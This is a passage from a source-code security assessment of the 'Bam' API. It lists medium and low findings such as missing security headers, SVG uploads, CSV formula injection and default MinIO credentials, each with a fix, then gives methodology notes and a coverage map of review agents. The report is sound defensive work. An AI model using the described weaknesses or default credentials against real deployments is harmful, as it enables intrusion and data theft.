The error handler includes `error.name`, `error.message`, and `error.code` in production 500 responses. While the stack trace is correctly redacted in production, the error name and message may contain internal details (e.g., database column names, constraint names, or file paths) that aid attacker reconnaissance.

**Recommended Fix:**
In production, return only the generic message and `request_id`. Log the full error server-side for debugging. Expose detailed error info only in development mode.

---

#### BAM-037: No `@fastify/helmet` for Security Headers

| Field | Value |
|-------|-------|
| **ID** | BAM-037 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/` (server setup) |

**Description:**
The API does not use `@fastify/helmet` or equivalent middleware to set security headers (`X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, `Content-Security-Policy`, `Referrer-Policy`). This leaves the application vulnerable to clickjacking, MIME sniffing, and other header-based attacks.

**Recommended Fix:**
Register `@fastify/helmet` with appropriate configuration. At minimum, set `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, and `Strict-Transport-Security` (when HTTPS is enabled).

---

#### BAM-038: Cross-Project Carry-Forward

| Field | Value |
|-------|-------|
| **ID** | BAM-038 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/services/task.service.ts` |

**Description:**
The carry-forward logic does not validate that the destination sprint belongs to the same project as the source task. An attacker could potentially carry forward tasks from one project into a sprint belonging to a different project, violating data isolation.

**Recommended Fix:**
Validate that `task.project_id === destinationSprint.project_id` before allowing carry-forward. Also prevent carry-forward by direct `sprint_id` update on the task (the sprint_id field should only be set through the carry-forward or sprint-assignment flow).

---

#### BAM-039: Sprint Start/Complete Race Conditions

| Field | Value |
|-------|-------|
| **ID** | BAM-039 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/routes/sprint.routes.ts` |

**Description:**
Sprint start and completion operations read the current sprint status and then update it in separate queries without a transaction or optimistic locking. Two concurrent requests could both read `status: 'planned'` and both attempt to start the sprint, potentially leading to duplicate side effects (e.g., double Slack notifications, double carry-forward).

**Recommended Fix:**
Wrap sprint status transitions in a transaction with `SELECT ... FOR UPDATE` or use an `UPDATE ... WHERE status = 'planned' RETURNING *` pattern to make the operation atomic.

---

#### BAM-040: iCal Feed API Key in Query String

| Field | Value |
|-------|-------|
| **ID** | BAM-040 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/routes/ical.routes.ts` |

**Description:**
The iCal feed authenticates via an API key passed as a query parameter. Query parameters are logged in web server access logs, proxy logs, browser history, and the HTTP `Referer` header, increasing the risk of credential exposure. Additionally, the iCal endpoint does not verify the caller's project membership.

**Recommended Fix:**
1. Use a dedicated, short-lived feed token stored server-side rather than the full API key.
2. Verify project membership before serving the iCal feed.
3. Document the risk of query-string authentication in the API key creation UI.

---

#### BAM-041: Invitation and Email Verification Tokens Stored in Plaintext

| Field | Value |
|-------|-------|
| **ID** | BAM-041 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/db/schema/guest-invitations.ts`, `apps/api/src/routes/email-verify.routes.ts` |

**Description:**
Invitation tokens and email verification tokens are stored as plaintext strings in the database. If the database is compromised, all pending invitations and email verification links can be used by the attacker.

**Recommended Fix:**
Store a SHA-256 hash of the token in the database. Send the raw token in the email link. On verification, hash the incoming token and compare against the stored hash.

---

#### BAM-042: SVG Files Allowed as Image Uploads

| Field | Value |
|-------|-------|
| **ID** | BAM-042 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/routes/upload.routes.ts` (line 21) |

**Description:**
The MIME type allowlist uses the prefix `image/*`, which includes `image/svg+xml`. SVG files can contain embedded JavaScript (`<script>` tags, `onload` handlers) and external entity references. When served inline, these execute in the user's browser.

**Recommended Fix:**
Explicitly exclude `image/svg+xml` from the allowed prefix match, or sanitize SVG files by stripping script elements and event handlers before storage. Serve SVGs with `Content-Disposition: attachment` to prevent inline rendering.

---

#### BAM-043: No Database SSL / No Redis TLS

| Field | Value |
|-------|-------|
| **ID** | BAM-043 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/env.ts`, `apps/api/src/db/index.ts`, `apps/api/src/plugins/redis.ts` |

**Description:**
The database connection URL and Redis URL do not enforce or default to TLS. In production deployments where the database or Redis instance is on a separate host, traffic (including credentials and sensitive data) travels in plaintext over the network.

**Recommended Fix:**
Add `DB_SSL` and `REDIS_TLS` environment variables. Default to TLS-enabled connections in production (`NODE_ENV=production`). Document the requirement in `.env.example`.

---

#### BAM-044: `trustProxy` Not Configured (Rate Limiting Broken)

| Field | Value |
|-------|-------|
| **ID** | BAM-044 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/` (Fastify server setup) |

**Description:**
Fastify's `trustProxy` is not configured. Behind nginx, all requests appear to come from the same IP (the nginx container). This means the IP-based rate limiter (`@fastify/rate-limit`) counts all users as a single client, making rate limiting ineffective and potentially blocking legitimate users when the shared limit is exceeded.

**Recommended Fix:**
Set `trustProxy: true` (or the specific nginx IP/subnet) in the Fastify server configuration. This enables correct `X-Forwarded-For` parsing so rate limiting operates on the real client IP.

---

### 4.4 Low

---

#### BAM-045: COOKIE_SECURE Defaults to False

| Field | Value |
|-------|-------|
| **ID** | BAM-045 |
| **Severity** | Low |
| **Affected Files** | `apps/api/src/env.ts` (line 36) |

**Description:**
`COOKIE_SECURE` defaults to `false`, meaning session cookies are sent over plaintext HTTP by default. In production with HTTPS, this must be explicitly set to `true` or cookies will be vulnerable to interception on mixed-content pages.

**Recommended Fix:**
Default `COOKIE_SECURE` to `true` when `NODE_ENV === 'production'`. Document the override in `.env.example`.

---

#### BAM-046: No Password Complexity Requirements

| Field | Value |
|-------|-------|
| **ID** | BAM-046 |
| **Severity** | Low |
| **Affected Files** | `apps/api/src/routes/auth.routes.ts` |

**Description:**
User registration and password change endpoints do not enforce password complexity (minimum length, character diversity). Users can set trivially weak passwords.

**Recommended Fix:**
Enforce a minimum length of 10 characters. Consider using a breached-password check (e.g., HaveIBeenPwned k-anonymity API) rather than complex character-class rules.

---

#### BAM-047: CSRF on Logout Endpoint

| Field | Value |
|-------|-------|
| **ID** | BAM-047 |
| **Severity** | Low |
| **Affected Files** | `apps/api/src/routes/auth.routes.ts`, `apps/api/src/plugins/csrf.ts` |

**Description:**
The logout endpoint (`POST /auth/logout`) may not be protected by CSRF validation. While the impact is limited (logging a user out is annoying but not damaging), it violates the principle of consistent CSRF protection on all state-changing endpoints.

**Recommended Fix:**
Ensure the CSRF middleware covers the logout route.

---

#### BAM-048: Impersonation Without Target User Consent

| Field | Value |
|-------|-------|
| **ID** | BAM-048 |
| **Severity** | Low |
| **Affected Files** | `apps/api/src/plugins/auth.ts` (lines 456-513) |

**Description:**
SuperUser impersonation does not notify the target user or require their consent. While impersonation is audit-logged, the target user has no visibility into when or whether they are being impersonated.

**Recommended Fix:**
Send an email notification to the target user when an impersonation session begins. Display an in-app banner when a user's account is being actively impersonated.

---

#### BAM-049: CSV Formula Injection in Exports

| Field | Value |
|-------|-------|
| **ID** | BAM-049 |
| **Severity** | Low |
| **Affected Files** | `apps/api/src/routes/export.routes.ts` (lines 66-82) |

**Description:**
The CSV export does not sanitize cell values that begin with `=`, `+`, `-`, or `@`. When opened in Excel or Google Sheets, these values are interpreted as formulas, potentially triggering data exfiltration or command execution.

**Recommended Fix:**
Prefix cell values that begin with `=`, `+`, `-`, `@`, `\t`, or `\r` with a single quote (`'`) or tab character to prevent formula interpretation.

---

#### BAM-050: Guest Token Leaked in Development Response

| Field | Value |
|-------|-------|
| **ID** | BAM-050 |
| **Severity** | Low |
| **Affected Files** | `apps/api/src/routes/guest.routes.ts` |

**Description:**
The guest invitation acceptance flow returns the guest's authentication token in the API response body in development mode. If development settings accidentally leak to production, this token could be captured.

**Recommended Fix:**
Guard the token inclusion with an explicit `NODE_ENV === 'development'` check. Consider never returning tokens in response bodies; use `Set-Cookie` exclusively.

---

#### BAM-051: Argon2 Parameters Not Pinned

| Field | Value |
|-------|-------|
| **ID** | BAM-051 |
| **Severity** | Low |
| **Affected Files** | `apps/api/src/services/auth.service.ts` |

**Description:**
Argon2id hashing uses the library's default parameters without explicitly pinning `memoryCost`, `timeCost`, and `parallelism`. Library updates could change defaults, causing existing hashes to become unverifiable or weakening security.

**Recommended Fix:**
Explicitly set Argon2 parameters: `memoryCost: 65536` (64 MB), `timeCost: 3`, `parallelism: 4`. Store the parameter version alongside the hash for future migration.

---

#### BAM-052: Default MinIO Credentials in Environment Defaults

| Field | Value |
|-------|-------|
| **ID** | BAM-052 |
| **Severity** | Low |
| **Affected Files** | `apps/api/src/env.ts` (lines 30-31) |

**Description:**
`S3_ACCESS_KEY` and `S3_SECRET_KEY` default to `minioadmin`/`minioadmin`. While this is convenient for local development, deploying with default credentials exposes all uploaded files to anyone who can reach the MinIO port.

**Recommended Fix:**
Remove defaults for `S3_ACCESS_KEY` and `S3_SECRET_KEY` in production (require them to be set explicitly). Add a startup check that warns if default credentials are detected when `NODE_ENV === 'production'`.

---

#### BAM-053: No CORS Origin Validation

| Field | Value |
|-------|-------|
| **ID** | BAM-053 |
| **Severity** | Low |
| **Affected Files** | `apps/api/src/env.ts` (line 14) |

**Description:**
`CORS_ORIGIN` defaults to `http://localhost:3000` and is passed directly to the CORS plugin as a string. There is no validation that the origin is a valid URL or that it matches the deployment domain. A misconfigured wildcard (`*`) would allow any origin to make credentialed requests.

**Recommended Fix:**
Validate `CORS_ORIGIN` as a proper URL or comma-separated list of URLs. Reject `*` when `COOKIE_SECURE` is true. Log a warning if the configured origin does not match the deployment domain.

---

#### BAM-054: Filename Allows Double Extensions

| Field | Value |
|-------|-------|
| **ID** | BAM-054 |
| **Severity** | Low |
| **Affected Files** | `apps/api/src/routes/upload.routes.ts` (line 78) |

**Description:**
The filename sanitizer (`file.filename.replace(/[^a-zA-Z0-9._-]/g, '_')`) preserves dots, allowing filenames like `payload.html.png`. While the MIME type is set from the upload, some systems may interpret the file based on the first extension.

**Recommended Fix:**
After sanitization, extract only the final extension and prepend it to the UUID-based key. Alternatively, strip all but the last dot from the filename.

---

## 5. Methodology Notes

- **Scope limitation:** This assessment covers only the Bam API (`apps/api/`) and Bam Frontend (`apps/frontend/`). Other modules (Banter, Beacon, Brief, Bolt, Bearing, Board, Bond, Blast, Bench, Helpdesk, MCP Server, Worker) were not assessed.
- **Static analysis only:** All findings are based on source code review. No dynamic testing (penetration testing, fuzzing) was performed.
- **Deduplication:** Where multiple agents reported the same underlying issue, findings were merged into a single entry with the highest severity assessment retained.
- **False positive rate:** Static analysis may flag patterns that are mitigated by runtime conditions not visible in source (e.g., nginx rules, network policies). Each finding should be validated against the deployed architecture before prioritization.
- **CVSS scores:** Not assigned. Severity ratings are qualitative (Critical/High/Medium/Low) based on exploitability, impact, and affected data sensitivity.

---

## 6. Appendix: Agent Coverage Map

| Agent | Focus Area | Findings Contributed |
|-------|-----------|---------------------|
| Agent 1 | Auth & Session | BAM-027, BAM-028, BAM-029, BAM-045, BAM-046, BAM-047, BAM-048 |
| Agent 2 | Input Validation | BAM-009, BAM-010, BAM-023, BAM-025, BAM-049, BAM-050 |
| Agent 3 | Authorization (RBAC) | BAM-001, BAM-004, BAM-005, BAM-006, BAM-007, BAM-012, BAM-013, BAM-014, BAM-015, BAM-022, BAM-031, BAM-032, BAM-033 |
| Agent 4 | Data Exposure & XSS | BAM-016, BAM-017, BAM-034, BAM-035, BAM-036 |
| Agent 5 | File Upload | BAM-008, BAM-018, BAM-024, BAM-042, BAM-054 |
| Agent 6 | WebSocket | BAM-002, BAM-019 |
| Agent 7 | Rate Limiting & DoS | BAM-020, BAM-021, BAM-030 |
| Agent 8 | Business Logic | BAM-038, BAM-039, BAM-040 |
| Agent 9 | Cryptography | BAM-003, BAM-011, BAM-041, BAM-051 |
| Agent 10 | Dependencies & Config | BAM-037, BAM-043, BAM-044, BAM-052, BAM-053 |

---

*End of assessment.*
